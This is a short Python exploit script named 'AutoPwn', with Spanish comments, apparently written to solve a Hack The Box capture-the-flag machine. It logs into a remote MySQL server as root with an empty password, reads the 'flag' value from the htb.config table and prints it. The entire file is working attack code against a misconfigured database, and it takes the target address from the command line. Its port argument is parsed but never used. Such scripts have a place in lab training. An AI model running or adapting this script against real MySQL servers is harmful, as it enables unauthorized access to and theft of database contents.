#/usr/bin/python3

import argparse
import mysql.connector

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self, ip_address, username, password):
        try:
            # Establecer la conexión con la base de datos
            connection = mysql.connector.connect(
                host= self.ip_address,
                user= username,
                password="",
                database="htb"
            )

            # Crear un cursor para ejecutar consultas
            cursor = connection.cursor()

            # Ejemplo de consulta
            cursor.execute("SELECT value AS flag FROM htb.config WHERE name = 'flag'")

            # Obtener los resultados de la consulta
            results = cursor.fetchall()

            # Obtener el valor de la columna 'flag'
            flag_value = results[0][0] 

            # Imprimir el valor de la columna 'flag'
            print(f"\nEl contenido de la 'flag': {flag_value}")

            # Cerrar el cursor y la conexión
            cursor.close()
            connection.close()

        except mysql.connector.Error as error:
            print(f"Error al conectar a la base de datos: {error}")

def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    args = get_arguments()

    exploit = Exploit(args.ip_address, args.lport)
    username = "root"# Define el nombre de usuario aquí
    password = ""
    exploit.run(args.ip_address, username, password)

if __name__ == '__main__':
    main()





